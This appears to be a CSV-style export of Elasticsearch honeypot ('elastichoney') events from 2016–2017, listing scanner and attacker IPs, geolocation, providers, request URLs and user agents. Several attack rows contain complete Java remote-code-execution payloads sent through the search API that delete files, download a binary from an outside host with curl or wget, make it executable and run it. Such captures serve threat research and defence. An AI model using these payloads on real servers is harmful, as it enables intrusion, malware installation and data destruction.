id	ident	normalized	timestamp	unixTimestamp	week day	year	month	day	hour	minutes	seconds	channel	source_ip	source_ip_num	source_port	destination_ip	destination_ip_num	destination_port	protocol	city	province	province_code	country	country_code	continent	latitude	longitude	asn	method	type	URL	form	user_agent
57e537e493e095049a48a81e	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-09-23 10:10:44.920	1474625444.92	Fri	2016	9	23	10	10	44.92	elastichoney.events	216.218.206.66	3638218306	None	192.168.10.4	3232238084	None	None	Fremont	California	CA	United States	US	North America	37.5497	-121.9621	Hurricane Electric - Inc.	GET	recon	192.168.10.4/		
580f2f2593e09505a9b123f9	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-10-25 06:08:37.468	1477375717.468	Tue	2016	10	25	6	8	37.468	elastichoney.events	198.20.69.98	3323217250	None	192.168.10.4	3232238084	9200	None	Chicago	Illinois	IL	United States	US	North America	41.8825	-87.6441	SingleHop - Inc.	GET	recon	192.168.10.4:9200/		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML - like Gecko) Chrome/41.0.2228.0 Safari/537.36
582efe3f93e09504da6ff8c3	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-11-18 08:12:31.958	1479456751.958	Fri	2016	11	18	8	12	31.958000000000002	elastichoney.events	198.20.70.114	3323217522	None	192.168.10.4	3232238084	9200	None	Chicago	Illinois	IL	United States	US	North America	41.8825	-87.6441	SingleHop - Inc.	GET	recon	192.168.10.4:9200/		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML - like Gecko) Chrome/41.0.2228.0 Safari/537.36
5842cf0d93e09504da72799f	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-12-03 08:56:29.191	1480755389.191	Sat	2016	12	3	8	56	29.191	elastichoney.events	66.240.192.138	1123074186	None	192.168.10.4	3232238084	9200	None	San Diego	California	CA	United States	US	North America	32.8073	-117.1324	CariNet - Inc.	GET	recon	192.168.10.4:9200/		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML - like Gecko) Chrome/41.0.2228.0 Safari/537.36
58438dc793e09504da72884f	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-12-03 22:30:15.281	1480804215.2810001	Sat	2016	12	3	22	30	15.280999999999999	elastichoney.events	94.102.49.190	1583755710	None	192.168.10.4	3232238084	9200	None	None	None	None	Seychelles	SC	Africa	-4.5833	55.6667	Quasi Networks LTD.	GET	recon	192.168.10.4:9200/		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML - like Gecko) Chrome/41.0.2228.0 Safari/537.36
5849e36793e09504da72e8b7	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-12-08 17:49:11.171	1481219351.171	Thr	2016	12	8	17	49	11.171	elastichoney.events	69.12.66.186	1158431418	None	192.168.10.4	3232238084	9200	None	Los Angeles	California	CA	United States	US	North America	34.0494	-118.2641	QuadraNet - Inc	GET	recon	192.168.10.4:9200/_all/_mapping		NING/1.0
584a609893e09504da72f4f3	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-12-09 02:43:20.805	1481251400.805	Fri	2016	12	9	2	43	20.805	elastichoney.events	69.12.66.186	1158431418	None	192.168.10.4	3232238084	9200	None	Los Angeles	California	CA	United States	US	North America	34.0494	-118.2641	QuadraNet - Inc	GET	recon	192.168.10.4:9200/_all/_mapping		Java/1.8.0_51
584e1a3593e09504da733889	78169b80-5ce8-11e6-94de-0800272a9814	True	2016-12-11 22:32:05.311	1481495525.311	Sun	2016	12	11	22	32	5.311	elastichoney.events	184.105.139.67	3093924675	None	192.168.10.6	3232238086	None	None	Fremont	California	CA	United States	US	North America	37.5497	-121.9621	JSC Digital Network	GET	recon	192.168.10.6/		
58648e4793e09504da75cad9	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-12-28 23:17:11.995	1482967031.995	Wed	2016	12	28	23	17	11.995	elastichoney.events	74.82.47.5	1246899973	None	192.168.10.4	3232238084	None	None	Fremont	California	CA	United States	US	North America	37.5497	-121.9621	Hurricane Electric - Inc.	GET	recon	192.168.10.4/		
587079fc93e09504da76e9cf	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-07 00:17:48.878	1483748268.8779998	Sat	2017	1	7	0	17	48.878	elastichoney.events	167.160.182.20	2812327444	None	192.168.10.4	3232238084	9200	None	Los Angeles	California	CA	United States	US	North America	34.0494	-118.2641	QuadraNet - Inc	POST	attack	192.168.10.4:9200/_search		python-requests/2.12.4
587079fd93e09504da76e9d0	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-07 00:17:49.031	1483748269.0310001	Sat	2017	1	7	0	17	49.031000000000006	elastichoney.events	167.160.182.20	2812327444	None	192.168.10.4	3232238084	9200	None	Los Angeles	California	CA	United States	US	North America	34.0494	-118.2641	QuadraNet - Inc	POST	attack	192.168.10.4:9200/_search		python-requests/2.12.4
587c4f1193e09504da77d32b	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-15 23:41:53.752	1484523713.752	Sun	2017	1	15	23	41	53.751999999999995	elastichoney.events	74.82.47.5	1246899973	None	192.168.10.4	3232238084	None	None	Fremont	California	CA	United States	US	North America	37.5497	-121.9621	Hurricane Electric - Inc.	GET	recon	192.168.10.4/		
587c565c93e09504da77d397	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-16 00:13:00.561	1484525580.561	Mon	2017	1	16	0	13	0.561	elastichoney.events	89.248.167.140	1509468044	None	192.168.10.4	3232238084	9200	None	None	None	None	Seychelles	SC	Africa	-4.5833	55.6667	Quasi Networks LTD.	GET	recon	192.168.10.4:9200/_cat/indices?bytes=b&format=json	bytes=b&format=json	Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; Trident/5.0)
587e06d593e09504da77f117	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-17 06:58:13.467	1484636293.467	Tue	2017	1	17	6	58	13.467	elastichoney.events	123.249.27.46	2079922990	None	192.168.10.4	3232238084	9200	None	Shenzhen	Guangdong	44	China	CN	Asia	22.5333	114.1333	Chinanet	GET	attack	"192.168.10.4:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm *\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
587e06e393e09504da77f11d	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-17 06:58:27.420	1484636307.42	Tue	2017	1	17	6	58	27.42	elastichoney.events	123.249.27.46	2079922990	None	192.168.10.4	3232238084	9200	None	Shenzhen	Guangdong	44	China	CN	Asia	22.5333	114.1333	Chinanet	GET	attack	"192.168.10.4:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""curl -o /tmp/cysip http://116.48.48.14/cysip\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""curl+-o+/tmp/cysip+http://116.48.48.14/cysip\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
587e06ef93e09504da77f125	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-17 06:58:39.185	1484636319.185	Tue	2017	1	17	6	58	39.185	elastichoney.events	123.249.27.46	2079922990	None	192.168.10.4	3232238084	9200	None	Shenzhen	Guangdong	44	China	CN	Asia	22.5333	114.1333	Chinanet	GET	attack	"192.168.10.4:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""wget -c http://116.48.48.14/cysip\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""wget+-c+http://116.48.48.14/cysip\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
587e06f493e09504da77f127	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-17 06:58:44.487	1484636324.4870002	Tue	2017	1	17	6	58	44.486999999999995	elastichoney.events	123.249.27.46	2079922990	None	192.168.10.4	3232238084	9200	None	Shenzhen	Guangdong	44	China	CN	Asia	22.5333	114.1333	Chinanet	GET	attack	"192.168.10.4:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""chmod 777 /tmp/./cysip\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""chmod+777+/tmp/./cysip\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
587e06f993e09504da77f129	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-17 06:58:49.778	1484636329.7779999	Tue	2017	1	17	6	58	49.778	elastichoney.events	123.249.27.46	2079922990	None	192.168.10.4	3232238084	9200	None	Shenzhen	Guangdong	44	China	CN	Asia	22.5333	114.1333	Chinanet	GET	attack	"192.168.10.4:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./cysip\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./cysip\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
587e070093e09504da77f12b	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-17 06:58:56.043	1484636336.043	Tue	2017	1	17	6	58	56.043	elastichoney.events	123.249.27.46	2079922990	None	192.168.10.4	3232238084	9200	None	Shenzhen	Guangdong	44	China	CN	Asia	22.5333	114.1333	Chinanet	GET	attack	"192.168.10.4:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
5880552e93e09504da780f2a	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-01-19 00:57:02.922	1484787422.9220002	Thr	2017	1	19	0	57	2.9219999999999997	elastichoney.events	125.64.94.201	2101370569	None	192.168.10.6	3232238086	None	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	recon	/		
588057b393e09504da780f5d	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-01-19 01:07:47.263	1484788067.2629998	Thr	2017	1	19	1	7	47.263000000000005	elastichoney.events	125.64.94.201	2101370569	None	192.168.10.6	3232238086	None	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	recon	/		
5881945493e09504da781e5b	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-01-19 23:38:44.879	1484869124.879	Thr	2017	1	19	23	38	44.879	elastichoney.events	74.82.47.5	1246899973	None	192.168.10.6	3232238086	None	None	Fremont	California	CA	United States	US	North America	37.5497	-121.9621	Hurricane Electric - Inc.	GET	recon	192.168.10.6/		
589d563b93e09504da7971a9	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-02-10 00:57:15.215	1486688235.215	Fri	2017	2	10	0	57	15.215	elastichoney.events	107.179.126.111	1806925423	None	192.168.10.4	3232238084	9200	None	Los Angeles	California	CA	United States	US	North America	34.0729	-118.2606	Global Frag Networks	POST	attack	192.168.10.4:9200/_search		python-requests/2.13.0
589d877c93e09504da7972d1	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-02-10 04:27:24.891	1486700844.891	Fri	2017	2	10	4	27	24.891	elastichoney.events	107.179.126.111	1806925423	None	192.168.10.4	3232238084	9200	None	Los Angeles	California	CA	United States	US	North America	34.0729	-118.2606	Global Frag Networks	POST	attack	192.168.10.4:9200/_search		python-requests/2.13.0
58e702d293e0950608bc5df5	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-06 23:09:06.311	1491520146.311	Thr	2017	4	6	23	9	6.311	elastichoney.events	74.82.47.3	1246899971	None	192.168.10.6	3232238086	None	None	Fremont	California	CA	United States	US	North America	37.5497	-121.9621	Hurricane Electric - Inc.	GET	recon	192.168.10.6/		
58e705c693e0950608bc5e15	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-04-06 23:21:42.581	1491520902.581	Thr	2017	4	6	23	21	42.581	elastichoney.events	184.105.247.195	3093952451	None	192.168.10.4	3232238084	None	None	Salt Lake City	Utah	UT	United States	US	North America	40.7002	-111.9434	Hurricane Electric - Inc.	GET	recon	192.168.10.4/		
58e9c1ed93e0950608bc7e29	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-09 01:09:01.160	1491700141.16	Sun	2017	4	9	1	9	1.16	elastichoney.events	120.24.79.205	2014859213	None	192.168.10.6	3232238086	9200	None	Shenzhen	Guangdong	44	China	CN	Asia	22.5333	114.1333	Hangzhou Alibaba Advertising Co. -Ltd.	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm *\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58e9c22193e0950608bc7e2b	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-09 01:09:53.769	1491700193.769	Sun	2017	4	9	1	9	53.769	elastichoney.events	120.24.79.205	2014859213	None	192.168.10.6	3232238086	9200	None	Shenzhen	Guangdong	44	China	CN	Asia	22.5333	114.1333	Hangzhou Alibaba Advertising Co. -Ltd.	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""chmod 777 /tmp/./4354354Linux2.6\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""chmod+777+/tmp/./4354354Linux2.6\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58e9c22793e0950608bc7e31	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-09 01:09:59.932	1491700199.9320002	Sun	2017	4	9	1	9	59.931999999999995	elastichoney.events	120.24.79.205	2014859213	None	192.168.10.6	3232238086	9200	None	Shenzhen	Guangdong	44	China	CN	Asia	22.5333	114.1333	Hangzhou Alibaba Advertising Co. -Ltd.	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./4354354Linux2.6\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./4354354Linux2.6\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
